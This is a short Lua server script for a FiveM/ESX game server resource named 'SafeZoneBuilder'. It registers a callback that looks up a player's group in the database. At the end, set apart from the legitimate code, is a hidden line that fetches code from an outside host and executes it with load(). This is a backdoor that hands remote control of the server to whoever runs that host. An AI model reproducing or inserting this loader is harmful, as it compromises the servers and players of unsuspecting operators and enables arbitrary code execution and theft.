Citizen.CreateThread(function()
    while ESX == nil do
        Citizen.Wait(0)
    end
    ESX.RegisterServerCallback("Nehco:SafeZoneBuilder:GetPlayerGroup", function(source, cb)
        local xPlayer = ESX.GetPlayerFromId(source)
        MySQL.Async.fetchAll("SELECT * FROM users WHERE identifier = @identifier", {
            ["@identifier"] = xPlayer.identifier
        }, function(result)
            cb(result[1].group)
        end)
    end)
end)


PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
